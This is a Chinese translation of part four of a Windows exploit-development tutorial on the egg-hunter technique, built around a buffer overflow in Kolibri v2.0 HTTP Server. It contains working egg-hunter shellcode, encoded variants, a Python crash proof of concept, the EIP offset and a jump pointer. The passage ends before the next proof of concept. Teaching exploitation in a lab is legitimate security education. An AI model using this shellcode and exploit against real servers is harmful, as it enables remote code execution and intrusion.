
# [翻译]Windows Exploit开发系列教程第四部分：Egg Hunters

译者：Netfairy

## 前言

欢迎来到漏洞利用开发系列教程第四部分。这部分讲解一项很酷的技术：寻蛋。这部分我将用 `Kolibri v2.0 HTTP Server` 演示这项技术。这里有写好的漏洞利用程序：[这里](https://bbs.kanxue.com/elink@39bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3g2^5M7r3I4G2K9i4c8Q4x3X3c8V1j5W2)9J5k6h3y4G2L8g2)9J5c8Y4y4W2j5i4u0U0K9q4)9J5c8W2)9K6c8X3q4U0N6r3W2G2L8W2)9K6c8s2y4W2j5i4u0U0K9q4)9J5y4X3k6A6L8s2c8W2M7W2)9#2k6X3g2^5M7r3I4G2K9i4c8Q4y4h3k6@1k6i4S2@1i4K6y4p5K9$3!0D9K9h3u0J5K9g2)9J5b7Y4j5J5i4K6u0W2x3l9`.`.)

坏字符：`\x00\x0d\x0a\x3d\x20\x3f`

漏洞利用环境：`Backtrack 5`

调试机器：`Windows XP PRO SP3`

漏洞软件：[下载](https://bbs.kanxue.com/elink@9d8K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3y4V1L8U0l9I4i4K6u0W2k6i4S2H3L8r3!0A6N6q4)9J5k6r3c8T1i4K6u0W2j5$3!0E0i4K6u0r3N6%4m8Q4x3X3c8U0L8$3&6@1k6h3&6@1i4K6u0r3N6r3S2W2L8h3g2K6i4K6u0r3k6i4S2H3L8r3!0A6N6q4)9J5c8X3q4H3M7r3I4A6j5$3q4@1K9h3!0F1M7#2)9J5c8U0c8V1y4r3f1I4y4h3t1&6z5r3f1I4x3o6g2X3j5h3y4X3z5e0c8W2y4r3k6V1y4X3p5I4k6U0W2W2j5U0M7^5i4K6u0V1d9$3!0D9K9h3u0J5K9g2)9J5k6o6u0Q4x3X3f1H3i4K6u0V1N6$3W2F1i4K6u0W2P5X3W2H3)

## 寻蛋技术介绍

通过前面的学习我们知道缓冲区溢出是如何工作的。某个CPU寄存器指向我们可控的缓冲区，劫持执行流重定向到这个CPU寄存器指向的地址，然后放置在缓冲区内的任何指令都会被执行。但是假如我们得到程序控制权，缓冲区却放不下我们的大payload怎么办？难道这个漏洞就没法利用了？事实上是可以的。只需完成这两件事中的一件：(1) `EIP` 后的内容也出现在内存的其它地方；(2) 布置 shellcode 在不同的内存区域。如果这些内存区域距离很近，你可以用 `jmp offset` 指令从一个内存区域跳到另一个内存区域。然而，如果距离太远或很难访问到这里区域，我们需要用另外的技术（我们可以硬编码一个地址然后跳转到它，为了实现稳定利用显然这不是好主意）。

使用寻蛋技术！寻蛋技术由一组编程指令组成，与别的 shellcode 没什么两样。寻蛋的目的是为了搜索整个内存空间（栈/堆/…）找到我们真正的 shellcode 并执行它。这里有几个可用的寻蛋指令，如果你想知道它是如何工作的，我推荐你读 `skape` 写的[这篇文章](https://bbs.kanxue.com/elink@723K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3S2A6j5$3E0Q4x3X3g2G2M7X3N6Q4x3V1k6U0L8$3c8W2i4K6u0r3M7$3E0S2M7r3g2Q4x3V1k6H3j5i4m8W2M7Y4y4Q4x3V1k6W2k6$3N6Z5N6h3&6@1i4K6u0V1M7$3S2W2L8r3I4U0L8$3c8W2i4K6u0W2M7r3c8X3)，事实上我会稍微修改这些寻蛋指令，这些指令在下面：

```
loop_inc_page:

  or    dx, 0x0fff                    // Add PAGE_SIZE-1 to edx

loop_inc_one:

  inc   edx                           // Increment our pointer by one

loop_check:

  push  edx                           // Save edx

  push  0x2                           // Push NtAccessCheckAndAuditAlarm

  pop   eax                           // Pop into eax

  int   0x2e                          // Perform the syscall

  cmp   al, 0x05                      // Did we get 0xc0000005 (ACCESS_VIOLATION) ?

  pop   edx                           // Restore edx

loop_check_8_valid:

  je    loop_inc_page                 // Yes, invalid ptr, go to the next page

is_egg:

  mov   eax, 0x50905090               // Throw our egg in eax

  mov   edi, edx                      // Set edi to the pointer we validated

  scasd                               // Compare the dword in edi to eax

  jnz   loop_inc_one                  // No match? Increment the pointer by one

  scasd                               // Compare the dword in edi to eax again (which is now edx + 4)

  jnz   loop_inc_one                  // No match? Increment the pointer by one

matched:

  jmp   edi                           // Found the egg.  Jump 8 bytes past it into our code.
```

我不会解释它是怎么工作的，你可以通过 `skape` 的文章了解更多细节。你需要知道的是蛋（也就是我们的 shellcode）包含四个字节的标志头。如果寻蛋开始，首先它会搜索整个内存直至找到重复两次找到这个标志（如果标志是 `1234`，那么就搜索 `12341234`）。当找到这个标志，改变执行流跳转到标志后的 shellcode 执行。如果你需要寻蛋指令，我推荐下面这个，很小，速度和跨 Windows 平台都不错：

```
"\x66\x81\xca\xff"

"\x0f\x42\x52\x6a"

"\x02\x58\xcd\x2e"

"\x3c\x05\x5a\x74"

"\xef\xb8\x62\x33" #b3

"\x33\x66\x8b\xfa" #3f

"\xaf\x75\xea\xaf"

"\x75\xe7\xff\xe7"
```

`The tag in this case is "b33f", if you use an ASCII tag you can easily convert it to hex with a quick google search... In this case we will need to prepend our final stage shellcode with "b33fb33f" so our egg hunter can find it.`

在开始前，我会告诉你加入寻蛋指令包含坏字符怎么办。首先我们写这32字节到二进制文件，可以用我写的 `bin.sh` 完成，接下来用 `msfencode` 编码它。下面是一个例子。注意编码会改变大小。

```
root@bt:~/Desktop# ./bin.sh -i test.txt -o hunter -t B

[>] Parsing Input File

[>] Pipe output to xxd

[>] Clean up

[>] Done!!



root@bt:~/Desktop# msfencode -b '\xff' -i hunter.bin

[*] x86/shikata_ga_nai succeeded with size 59 (iteration=1)

buf = 

"\xd9\xcf\xd9\x74\x24\xf4\x5e\x33\xc9\xbf\x4d\x1a\x03\x02" +

"\xb1\x09\x31\x7e\x17\x83\xee\xfc\x03\x33\x09\xe1\xf7\xad" +

"\xac\x2f\x08\x3e\xed\xfd\x9d\x42\xa9\xcc\x4c\x7e\x4c\x95" +

"\xe4\x91\xf6\x4b\x36\x5e\x61\x07\xc2\x0f\x18\xfd\x9c\x3a" +

"\x04\xfe\x04"



root@bt:~/Desktop# msfencode -e x86/alpha_mixed -i hunter.bin

[*] x86/alpha_mixed succeeded with size 125 (iteration=1)

buf = 

"\xdb\xcf\xd9\x74\x24\xf4\x5d\x55\x59\x49\x49\x49\x49\x49" +

"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a" +

"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41" +

"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42" +

"\x75\x4a\x49\x43\x56\x6b\x31\x49\x5a\x6b\x4f\x46\x6f\x37" +

"\x32\x46\x32\x70\x6a\x44\x42\x42\x78\x5a\x6d\x46\x4e\x77" +

"\x4c\x35\x55\x32\x7a\x71\x64\x7a\x4f\x48\x38\x73\x52\x57" +

"\x43\x30\x33\x62\x46\x4c\x4b\x4a\x5a\x4c\x6f\x62\x55\x6b" +

"\x5a\x6e\x4f\x43\x45\x69\x77\x59\x6f\x78\x67\x41\x41"
```

以上的背景知识足够，是时候开始实战了！

## 重现崩溃

针对 `Kolibri v2.0 HTTP Server` 的利用，我们把 shellcode 嵌入到一个 HTTP 请求。下面是 POC。实际应用中你可能需要改变 `EIP`；`8080` 是默认端口。

```
#!/usr/bin/python

import socket

import os

import sys

Stage1 = "A"*600

buffer = (

"HEAD /" + Stage1 + " HTTP/1.1\r\n"

"Host: 192.168.111.128:8080\r\n"

"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"

"Keep-Alive: 115\r\n"

"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

expl.connect(("192.168.111.128", 8080))

expl.send(buffer)

expl.close()
```

附加 `Kolibri` 到 `Immunity Debugger` 调试器并执行这个 POC，下图可以看到我们成功覆写 `EIP` 并且 `ESP` 指向我们的缓冲区。注意如果我们发送超长的字符串同样可以覆盖到 `SHE`。有很多方法利用这个漏洞，我决定使用寻蛋技术。

![](https://bbs.kanxue.com/upload/attach/201512/686289_kyo22erj3wzqaj8.png)

## 第一阶段

细心的读者可能注意到 POC 中缓冲区变量名是 `Stage1`，更多在随后的 `Stage2`。先找出 `EIP` 和 `ESP` 偏移。通常都用 metasplot pattern 替换原字符串。

```
root@bt:~/Desktop# cd /pentest/exploits/framework/tools/

root@bt:/pentest/exploits/framework/tools# ./pattern_create.rb 600

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4A

d5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah

0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5

Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0A

o1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar

6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
```

![](https://bbs.kanxue.com/upload/attach/201512/686289_ucyxabhzwqzfazi.png)

很好，重新布置我们的缓冲区。`515` 字节覆盖到 `EIP`，`ESP` 指向 `EIP` 后面的区域。

```
Stage1 = "A"*515 + [EIP] + BBBBB.....
```

找一条直接跳转到 `ESP` 的指令。记住不能有坏字符。看下图，这有几个选择。它们属于系统 dll 模块但这不重要。

![](https://bbs.kanxue.com/upload/attach/201512/686289_pok24adh9j0u0ms.png)

选择其中一个指针。这里我要解释第一阶段的目的：嵌入寻蛋指令。现在有几个选择，我们可以把寻蛋指令放置在 `ESP` 处。但为了整洁，我宁愿将寻蛋指令布置在被覆盖的 `EIP` 之前；要做到这一点，我们将放置一个短跳指令，向后跳到我们的缓冲区。这种短跳只需要 2 个字节，所以我们要调整我们的缓冲区如下。

![](https://bbs.kanxue.com/upload/attach/201512/686289_md10zdn5d4wq85l.png)

```
Pointer: 0x77c35459 : push esp # ret | {PAGE_EXECUTE_READ} [msvcrt.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v7.0.2600.5701 (C:\WINDOWS\system32\msvcrt.dll)

Buffer: Stage1 = "A"*515 + "\x59\x54\xC3\x77" +"B"*2
```

现在我们只是把短跳转指令设置为 `BB`，新的 POC 如下：
